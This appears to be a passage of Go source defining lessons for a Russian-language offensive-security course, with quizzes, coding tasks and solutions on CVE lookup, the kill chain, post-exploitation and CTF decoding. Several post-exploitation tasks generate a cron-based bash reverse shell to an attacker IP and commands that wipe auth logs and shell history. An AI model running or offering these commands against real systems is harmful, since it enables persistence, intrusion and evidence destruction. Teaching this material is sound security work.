}`, Hints: `<p>Map software+version → CVE. В реальности: NIST NVD API.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var s,v string;fmt.Scan(&s,&v);cves:=map[string]string{"Apache 2.4.49":"CVE-2021-41773: Path Traversal (critical)","Log4j 2.14":"CVE-2021-44228: Remote Code Execution (critical)"};if c,ok:=cves[s+" "+v];ok{fmt.Println(c)}else{fmt.Println("No known CVE")}}</code></pre>`},
			{Title: "Exploit chain", Difficulty: "hard", Description: `<p>Построй цепочку атаки из шагов:</p><p>Ввод: <code>5 recon scan exploit escalate exfiltrate</code></p><p>Вывод:</p><pre><code>Kill Chain:
1. recon → OSINT, subdomain enum
2. scan → nmap, nikto, ffuf
3. exploit → SQLi/RCE, initial access
4. escalate → privesc, lateral movement
5. exfiltrate → data extraction, persistence</code></pre>`, Glossary: []GlossaryItem{{Term: "Kill Chain", Definition: "Cyber Kill Chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions."}}, TestCases: []TestCase{{Input: "5 recon scan exploit escalate exfiltrate", ExpectedOutput: "Kill Chain:\n1. recon → OSINT, subdomain enum\n2. scan → nmap, nikto, ffuf\n3. exploit → SQLi/RCE, initial access\n4. escalate → privesc, lateral movement\n5. exfiltrate → data extraction, persistence"}},
				StarterCode: `package main
import "fmt"
func main() {
    var n int; fmt.Scan(&n)
    descriptions := map[string]string{"recon": "OSINT, subdomain enum", "scan": "nmap, nikto, ffuf", "exploit": "SQLi/RCE, initial access", "escalate": "privesc, lateral movement", "exfiltrate": "data extraction, persistence"}
    fmt.Println("Kill Chain:")
    for i := 1; i <= n; i++ { var step string; fmt.Scan(&step); fmt.Printf("%d. %s → %s\n", i, step, descriptions[step]) }
}`, Hints: `<p>Map step → description. Вывод с номером и описанием.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var n int;fmt.Scan(&n);d:=map[string]string{"recon":"OSINT, subdomain enum","scan":"nmap, nikto, ffuf","exploit":"SQLi/RCE, initial access","escalate":"privesc, lateral movement","exfiltrate":"data extraction, persistence"}
    fmt.Println("Kill Chain:");for i:=1;i<=n;i++{var s string;fmt.Scan(&s);fmt.Printf("%d. %s → %s\n",i,s,d[s])}}</code></pre>`},
			{Title: "Risk scoring", Difficulty: "hard", Description: `<p>Рассчитай CVSS-like score:</p><p>Ввод: <code>network low none high</code> (vector, complexity, auth, impact)</p><p>Вывод: <code>Score: 9.8 (Critical)</code></p>`, Glossary: []GlossaryItem{{Term: "CVSS", Definition: "Common Vulnerability Scoring System. 0-10 score: Low, Medium, High, Critical."}}, TestCases: []TestCase{{Input: "network low none high", ExpectedOutput: "Score: 9.8 (Critical)"}, {Input: "local high required low", ExpectedOutput: "Score: 3.5 (Low)"}},
				StarterCode: `package main
import "fmt"
func main() {
    var vector, complexity, auth, impact string
    fmt.Scan(&vector, &complexity, &auth, &impact)
    score := 5.0
    if vector == "network" { score += 2.0 } else { score -= 1.5 }
    if complexity == "low" { score += 1.5 } else { score -= 1.5 }
    if auth == "none" { score += 1.5 } else { score -= 0.5 }
    if impact == "high" { score += 0.8 }
    var severity string
    switch { case score >= 9.0: severity = "Critical"; case score >= 7.0: severity = "High"; case score >= 4.0: severity = "Medium"; default: severity = "Low" }
    fmt.Printf("Score: %.1f (%s)\n", score, severity)
}`, Hints: `<p>Каждый фактор добавляет/убирает баллы. Score → severity label.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var v,c,a,i string;fmt.Scan(&v,&c,&a,&i);s:=5.0;if v=="network"{s+=2}else{s-=1.5};if c=="low"{s+=1.5}else{s-=1.5};if a=="none"{s+=1.5}else{s-=0.5};if i=="high"{s+=0.8}
    var sv string;switch{case s>=9:sv="Critical";case s>=7:sv="High";case s>=4:sv="Medium";default:sv="Low"};fmt.Printf("Score: %.1f (%s)\n",s,sv)}</code></pre>`},
		},
	}
}

func lesson_sec_post_exploitation() L {
	return L{
		Slug: "sec-post-exploitation", Title: "Post-exploitation", Order: 7,
		Difficulty: "advanced", Track: "security-offense",
		Content: `<h1>Post-exploitation — после получения доступа</h1><p>Privilege escalation → Persistence → Lateral movement → Data exfiltration.</p>`,
		Quiz: []Q{
			{Question: "Persistence — зачем?", Options: []string{"Скорость", "Сохранить доступ после перезагрузки/патча — backdoor, cron job, service", "Логирование", "Шифрование"}, Correct: 1, Explanation: "После exploit: если сервер перезагрузят — доступ потерян. Persistence: cron reverse shell, SSH key, startup service."},
			{Question: "Lateral movement?", Options: []string{"Физическое перемещение", "Переход с одного компрометированного хоста на другие в сети", "Удаление следов", "Шифрование"}, Correct: 1, Explanation: "Получил доступ к web-серверу → используешь его для атаки на DB-сервер, internal API, AD. Расширение scope."},
			{Question: "Как скрыть присутствие?", Options: []string{"Ничего не делать", "Очистить логи, использовать timestomping, in-memory tools, encrypted C2", "Выключить сервер", "Удалить файлы"}, Correct: 1, Explanation: "Anti-forensics: очистка .bash_history, auth.log. Timestomping: изменить mtime файлов. In-memory: не писать на диск."},
			{Question: "C2 (Command & Control)?", Options: []string{"Сервер компании", "Сервер атакующего для управления скомпрометированными хостами", "CDN", "DNS"}, Correct: 1, Explanation: "C2: центральный сервер атакующего. Скомпрометированные хосты (agents) подключаются к C2, получают команды, отправляют данные."},
			{Question: "Data exfiltration — методы?", Options: []string{"Email", "DNS tunneling, HTTPS to C2, steganography, encoded in DNS queries", "Только USB", "FTP"}, Correct: 1, Explanation: "Методы вывода данных: через DNS (поддоменные запросы с данными), HTTPS (нормальный трафик), стеганография (скрыть в картинках). Выбирается чтобы обойти DLP."},
		},
		Tasks: []T{
			{Title: "Persistence methods", Difficulty: "easy", Description: `<p>Сгенерируй persistence для Linux:</p><p>Ввод: <code>cron 10.0.0.1 4444</code></p><p>Вывод: <code>echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -</code></p>`, Glossary: []GlossaryItem{{Term: "Cron persistence", Definition: "Добавить reverse shell в crontab — выполняется каждую минуту."}}, TestCases: []TestCase{{Input: "cron 10.0.0.1 4444", ExpectedOutput: "echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -"}},
				StarterCode: `package main
import "fmt"
func main() { var method, ip string; var port int; fmt.Scan(&method, &ip, &port); if method == "cron" { fmt.Printf("echo '* * * * * bash -i >& /dev/tcp/%s/%d 0>&1' | crontab -\n", ip, port) } }`, Hints: `<p>Cron: каждую минуту bash reverse shell к атакующему.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var m,ip string;var p int;fmt.Scan(&m,&ip,&p);if m=="cron"{fmt.Printf("echo '* * * * * bash -i >& /dev/tcp/%s/%d 0>&1' | crontab -\n",ip,p)}}</code></pre>`},
			{Title: "Log cleaner", Difficulty: "medium", Description: `<p>Команды очистки следов:</p><p>Ввод: <code>10.0.0.1</code></p><p>Вывод:</p><pre><code>sed -i '/10.0.0.1/d' /var/log/auth.log
echo > ~/.bash_history
history -c</code></pre>`, Glossary: []GlossaryItem{{Term: "Anti-forensics", Definition: "Удаление следов: логи, history, timestamps."}}, TestCases: []TestCase{{Input: "10.0.0.1", ExpectedOutput: "sed -i '/10.0.0.1/d' /var/log/auth.log\necho > ~/.bash_history\nhistory -c"}},
				StarterCode: `package main
import "fmt"
func main() { var ip string; fmt.Scan(&ip); fmt.Printf("sed -i '/%s/d' /var/log/auth.log\necho > ~/.bash_history\nhistory -c\n", ip) }`, Hints: `<p>sed удаляет строки с IP. echo очищает history файл. history -c очищает RAM.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var ip string;fmt.Scan(&ip);fmt.Printf("sed -i '/%s/d' /var/log/auth.log\necho > ~/.bash_history\nhistory -c\n",ip)}</code></pre>`},
			{Title: "Data exfil methods", Difficulty: "medium", Description: `<p>По ситуации предложи метод exfiltration:</p><p>Ввод: <code>only_dns_allowed</code></p><p>Вывод: <code>Method: DNS tunneling (encode data in subdomain queries)</code></p>`, Glossary: []GlossaryItem{{Term: "DNS tunneling", Definition: "Кодировать данные в DNS-запросах. Работает даже когда весь трафик заблокирован кроме DNS."}}, TestCases: []TestCase{{Input: "only_dns_allowed", ExpectedOutput: "Method: DNS tunneling (encode data in subdomain queries)"}, {Input: "https_allowed", ExpectedOutput: "Method: HTTPS to C2 (blend with normal traffic)"}},
				StarterCode: `package main
import "fmt"
func main() {
    var scenario string; fmt.Scan(&scenario)
    methods := map[string]string{"only_dns_allowed": "DNS tunneling (encode data in subdomain queries)", "https_allowed": "HTTPS to C2 (blend with normal traffic)", "no_outbound": "Steganography (hide in images uploaded to allowed sites)"}
    fmt.Printf("Method: %s\n", methods[scenario])
}`, Hints: `<p>По ограничениям сети → подходящий канал вывода данных.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var s string;fmt.Scan(&s);m:=map[string]string{"only_dns_allowed":"DNS tunneling (encode data in subdomain queries)","https_allowed":"HTTPS to C2 (blend with normal traffic)","no_outbound":"Steganography (hide in images uploaded to allowed sites)"};fmt.Printf("Method: %s\n",m[s])}</code></pre>`},
			{Title: "Lateral movement planner", Difficulty: "hard", Description: `<p>По network map предложи path к цели:</p><p>Ввод: <code>web→db→admin</code></p><p>Вывод:</p><pre><code>Path: web → db → admin
Step 1: web - extract DB credentials from config
Step 2: db - dump admin password hashes
Step 3: admin - pass-the-hash or crack</code></pre>`, Glossary: []GlossaryItem{{Term: "Lateral movement", Definition: "Перемещение по сети: web→db→AD. Каждый хоп даёт новые credentials/access."}}, TestCases: []TestCase{{Input: "web→db→admin", ExpectedOutput: "Path: web → db → admin\nStep 1: web - extract DB credentials from config\nStep 2: db - dump admin password hashes\nStep 3: admin - pass-the-hash or crack"}},
				StarterCode: `package main
import ("fmt"; "strings")
func main() {
    var path string; fmt.Scan(&path)
    hops := strings.Split(path, "→")
    fmt.Printf("Path: %s\n", strings.Join(hops, " → "))
    actions := map[string]string{"web": "extract DB credentials from config", "db": "dump admin password hashes", "admin": "pass-the-hash or crack"}
    for i, hop := range hops { fmt.Printf("Step %d: %s - %s\n", i+1, hop, actions[hop]) }
}`, Hints: `<p>Split по →. Каждый hop → конкретное действие для продвижения.</p>`, Solution: `<pre><code>package main
import("fmt";"strings")
func main(){var p string;fmt.Scan(&p);h:=strings.Split(p,"→");fmt.Printf("Path: %s\n",strings.Join(h," → "))
    a:=map[string]string{"web":"extract DB credentials from config","db":"dump admin password hashes","admin":"pass-the-hash or crack"}
    for i,hop:=range h{fmt.Printf("Step %d: %s - %s\n",i+1,hop,a[hop])}}</code></pre>`},
			{Title: "Full attack report", Difficulty: "hard", Description: `<p>Сгенерируй полный отчёт атаки:</p><p>Ввод: <code>target.com SQLi admin</code></p><p>Вывод:</p><pre><code>ATTACK REPORT
Target: target.com
Vector: SQLi
Result: admin access obtained
Recommendations: use prepared statements, input validation, WAF</code></pre>`, Glossary: []GlossaryItem{{Term: "Attack report", Definition: "Документирование: target, vector, impact, evidence, recommendations."}}, TestCases: []TestCase{{Input: "target.com SQLi admin", ExpectedOutput: "ATTACK REPORT\nTarget: target.com\nVector: SQLi\nResult: admin access obtained\nRecommendations: use prepared statements, input validation, WAF"}},
				StarterCode: `package main
import "fmt"
func main() {
    var target, vector, result string; fmt.Scan(&target, &vector, &result)
    recs := map[string]string{"SQLi": "use prepared statements, input validation, WAF", "XSS": "output encoding, CSP, HttpOnly cookies", "IDOR": "authorization checks, UUID instead of sequential IDs"}
    fmt.Printf("ATTACK REPORT\nTarget: %s\nVector: %s\nResult: %s access obtained\nRecommendations: %s\n", target, vector, result, recs[vector])
}`, Hints: `<p>По vector → рекомендации. Стандартный формат pentest report.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var t,v,r string;fmt.Scan(&t,&v,&r);recs:=map[string]string{"SQLi":"use prepared statements, input validation, WAF","XSS":"output encoding, CSP, HttpOnly cookies","IDOR":"authorization checks, UUID instead of sequential IDs"}
    fmt.Printf("ATTACK REPORT\nTarget: %s\nVector: %s\nResult: %s access obtained\nRecommendations: %s\n",t,v,r,recs[v])}</code></pre>`},
		},
	}
}

func lesson_sec_ctf() L {
	return L{
		Slug: "sec-ctf", Title: "CTF Methodology", Order: 8,
		Difficulty: "advanced", Track: "security-offense",
		Content: `<h1>CTF — Capture The Flag</h1>
<h2>Типы CTF</h2>
<p>Jeopardy: категории задач (web, crypto, pwn, forensics, misc). Attack-Defense: защищай свой сервер, атакуй чужие.</p>
<h2>Методология</h2>
<pre><code>1. Прочитай задание внимательно (hint в описании!)
2. Определи категорию: web? crypto? binary?
3. Собери информацию (curl, strings, file, xxd)
4. Попробуй стандартные подходы (SQLi, XSS, base64 decode)
5. Google: "CTF challenge_name writeup"
6. Флаг обычно: flag{...} или CTF{...}</code></pre>
<h2>Платформы</h2>
<pre><code>HackTheBox    — реалистичные машины для пентеста
TryHackMe     — обучающие комнаты с подсказками
PicoCTF       — для начинающих (школьники/студенты)
CTFtime.org   — календарь соревнований</code></pre>`,
		Quiz: []Q{
			{Question: "Jeopardy CTF — что это?", Options: []string{"Телешоу", "Категории задач (web, crypto, pwn, forensics) — решаешь и получаешь очки/флаги", "Attack-defense", "King of the hill"}, Correct: 1, Explanation: "Jeopardy: набор задач разной сложности. Каждая = flag{...}. Больше задач решил = больше очков. Командные или индивидуальные."},
			{Question: "HackTheBox vs TryHackMe?", Options: []string{"Одно и то же", "HTB: реалистичные машины без подсказок. THM: обучающие rooms с пошаговыми инструкциями", "HTB бесплатный", "THM сложнее"}, Correct: 1, Explanation: "TryHackMe — для начинающих (guided). HackTheBox — для продвинутых (без подсказок, реальный pentest). Начинай с THM, потом HTB."},
			{Question: "Первый шаг при решении web-задания CTF?", Options: []string{"Запустить sqlmap", "Прочитать исходный код (view-source, robots.txt, .git), проверить cookies, headers", "Brute-force", "Сканировать nmap"}, Correct: 1, Explanation: "View source, robots.txt, /.git/, comments в HTML — часто флаг или подсказка прямо там. Потом: cookies, hidden inputs, JS файлы."},
			{Question: "strings binary — зачем в CTF?", Options: []string{"Компиляция", "Извлечь читаемые строки из бинарного файла — часто содержит пароли, флаги, URL", "Запуск", "Отладка"}, Correct: 1, Explanation: "strings ищет ASCII/UTF-8 последовательности в binary. Часто: пароли захардкожены, flag{...} прямо в бинарнике, URL серверов."},
			{Question: "Где найти writeup если застрял?", Options: []string{"Нигде", "Google: 'CTF_name challenge_name writeup' или CTFtime.org — после завершения соревнования", "Спросить организаторов", "Сдаться"}, Correct: 1, Explanation: "После CTF участники публикуют writeup-ы (решения). CTFtime, Medium, личные блоги. Читай writeup-ы — лучший способ учиться новым техникам."},
		},
		Tasks: []T{
			{Title: "Flag format checker", Difficulty: "easy", Description: `<p>Проверь формат CTF-флага:</p><p>Ввод: <code>flag{s3cr3t_v4lu3}</code></p><p>Вывод: <code>VALID FLAG</code></p>`, Glossary: []GlossaryItem{{Term: "Flag format", Definition: "Обычно: flag{...}, CTF{...}, picoCTF{...}. Регулярка: \\w+\\{[^}]+\\}"}}, TestCases: []TestCase{{Input: "flag{s3cr3t_v4lu3}", ExpectedOutput: "VALID FLAG"}, {Input: "not_a_flag", ExpectedOutput: "INVALID FORMAT"}},
				StarterCode: `package main
import ("fmt"; "strings")
func main() {
    var input string; fmt.Scan(&input)
    if (strings.HasPrefix(input, "flag{") || strings.HasPrefix(input, "CTF{")) && strings.HasSuffix(input, "}") {
        fmt.Println("VALID FLAG")
    } else { fmt.Println("INVALID FORMAT") }
}`, Hints: `<p>Проверяй prefix flag{ или CTF{ и suffix }.</p>`, Solution: `<pre><code>package main
import("fmt";"strings")
func main(){var i string;fmt.Scan(&i);if(strings.HasPrefix(i,"flag{")||strings.HasPrefix(i,"CTF{"))&&strings.HasSuffix(i,"}"){fmt.Println("VALID FLAG")}else{fmt.Println("INVALID FORMAT")}}</code></pre>`},
			{Title: "Base64 decode", Difficulty: "easy", Description: `<p>Декодируй Base64 флаг:</p><p>Ввод: <code>ZmxhZ3toZWxsb193b3JsZH0=</code></p><p>Вывод: <code>flag{hello_world}</code></p>`, Glossary: []GlossaryItem{{Term: "Base64", Definition: "Кодирование бинарных данных в ASCII. Часто встречается в CTF для обфускации."}}, TestCases: []TestCase{{Input: "ZmxhZ3toZWxsb193b3JsZH0=", ExpectedOutput: "flag{hello_world}"}},
				StarterCode: `package main
import ("encoding/base64"; "fmt")
func main() { var encoded string; fmt.Scan(&encoded); decoded, _ := base64.StdEncoding.DecodeString(encoded); fmt.Println(string(decoded)) }`, Hints: `<p>base64.StdEncoding.DecodeString(encoded).</p>`, Solution: `<pre><code>package main
import("encoding/base64";"fmt")
func main(){var e string;fmt.Scan(&e);d,_:=base64.StdEncoding.DecodeString(e);fmt.Println(string(d))}</code></pre>`},
			{Title: "ROT13 decoder", Difficulty: "medium", Description: `<p>Декодируй ROT13:</p><p>Ввод: <code>synt{ebg13_vf_rnfl}</code></p><p>Вывод: <code>flag{rot13_is_easy}</code></p>`, Glossary: []GlossaryItem{{Term: "ROT13", Definition: "Сдвиг каждой буквы на 13 позиций. Простейший шифр. Часто в CTF."}}, TestCases: []TestCase{{Input: "synt{ebg13_vf_rnfl}", ExpectedOutput: "flag{rot13_is_easy}"}},
				StarterCode: `package main
import "fmt"
func rot13(s string) string {
    result := make([]byte, len(s))
    for i, c := range s {
        switch {
        case c >= 'a' && c <= 'z': result[i] = byte((c-'a'+13)%26 + 'a')
        case c >= 'A' && c <= 'Z': result[i] = byte((c-'A'+13)%26 + 'A')
        default: result[i] = byte(c)
        }
    }
    return string(result)
}
func main() { var s string; fmt.Scan(&s); fmt.Println(rot13(s)) }`, Hints: `<p>Каждая буква сдвигается на 13: a→n, b→o, ..., n→a.</p>`, Solution: `<pre><code>package main
import "fmt"
func rot13(s string)string{r:=make([]byte,len(s));for i,c:=range s{switch{case c>='a'&&c<='z':r[i]=byte((c-'a'+13)%26+'a');case c>='A'&&c<='Z':r[i]=byte((c-'A'+13)%26+'A');default:r[i]=byte(c)}};return string(r)}
func main(){var s string;fmt.Scan(&s);fmt.Println(rot13(s))}</code></pre>`},
			{Title: "Hex to ASCII", Difficulty: "medium", Description: `<p>Декодируй hex-строку:</p><p>Ввод: <code>666c61677b6865785f64656d6f7d</code></p><p>Вывод: <code>flag{hex_demo}</code></p>`, Glossary: []GlossaryItem{{Term: "Hex encoding", Definition: "Каждый байт как два hex символа. 41='A', 66='f'."}}, TestCases: []TestCase{{Input: "666c61677b6865785f64656d6f7d", ExpectedOutput: "flag{hex_demo}"}},
				StarterCode: `package main
import ("encoding/hex"; "fmt")
func main() { var h string; fmt.Scan(&h); decoded, _ := hex.DecodeString(h); fmt.Println(string(decoded)) }`, Hints: `<p>encoding/hex.DecodeString(hexStr) → []byte → string.</p>`, Solution: `<pre><code>package main
import("encoding/hex";"fmt")
func main(){var h string;fmt.Scan(&h);d,_:=hex.DecodeString(h);fmt.Println(string(d))}</code></pre>`},
			{Title: "CTF challenge solver", Difficulty: "hard", Description: `<p>Автоопределение encoding и декодирование:</p><p>Ввод: <code>ZmxhZ3thdXRvX2RlY29kZX0=</code></p><p>Вывод: <code>Detected: base64
Decoded: flag{auto_decode}</code></p>`, Glossary: []GlossaryItem{{Term: "Auto-detect encoding", Definition: "По формату определить: base64 (= padding), hex (только 0-9a-f), ROT13 (synt{ prefix)."}}, TestCases: []TestCase{{Input: "ZmxhZ3thdXRvX2RlY29kZX0=", ExpectedOutput: "Detected: base64\nDecoded: flag{auto_decode}"}, {Input: "synt{grfg}", ExpectedOutput: "Detected: rot13\nDecoded: flag{test}"}},
				StarterCode: `package main
import ("encoding/base64"; "encoding/hex"; "fmt"; "strings")
func rot13(s string) string {
    r := make([]byte, len(s)); for i, c := range s {
        switch { case c >= 'a' && c <= 'z': r[i] = byte((c-'a'+13)%26+'a'); case c >= 'A' && c <= 'Z': r[i] = byte((c-'A'+13)%26+'A'); default: r[i] = byte(c) }
    }; return string(r)
}
func isHex(s string) bool { for _, c := range s { if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) { return false } }; return len(s)%2 == 0 }
func main() {
    var input string; fmt.Scan(&input)
    switch {
    case strings.HasSuffix(input, "=") || strings.HasSuffix(input, "=="):
        decoded, _ := base64.StdEncoding.DecodeString(input); fmt.Printf("Detected: base64\nDecoded: %s\n", string(decoded))
    case strings.HasPrefix(input, "synt{"):
        fmt.Printf("Detected: rot13\nDecoded: %s\n", rot13(input))
    case isHex(input):
        decoded, _ := hex.DecodeString(input); fmt.Printf("Detected: hex\nDecoded: %s\n", string(decoded))
    default: fmt.Printf("Detected: plaintext\nDecoded: %s\n", input)
    }
}`, Hints: `<p>Определи по признакам: = в конце → base64, synt{ → rot13, только hex chars → hex.</p>`, Solution: `<pre><code>package main
import("encoding/base64";"encoding/hex";"fmt";"strings")
func rot13(s string)string{r:=make([]byte,len(s));for i,c:=range s{switch{case c>='a'&&c<='z':r[i]=byte((c-'a'+13)%26+'a');case c>='A'&&c<='Z':r[i]=byte((c-'A'+13)%26+'A');default:r[i]=byte(c)}};return string(r)}
func isHex(s string)bool{for _,c:=range s{if!((c>='0'&&c<='9')||(c>='a'&&c<='f')){return false}};return len(s)%2==0}
func main(){var i string;fmt.Scan(&i);switch{case strings.HasSuffix(i,"=")||strings.HasSuffix(i,"=="):d,_:=base64.StdEncoding.DecodeString(i);fmt.Printf("Detected: base64\nDecoded: %s\n",string(d));case strings.HasPrefix(i,"synt{"):fmt.Printf("Detected: rot13\nDecoded: %s\n",rot13(i));case isHex(i):d,_:=hex.DecodeString(i);fmt.Printf("Detected: hex\nDecoded: %s\n",string(d));default:fmt.Printf("Detected: plaintext\nDecoded: %s\n",i)}}</code></pre>`},
		},
	}
}
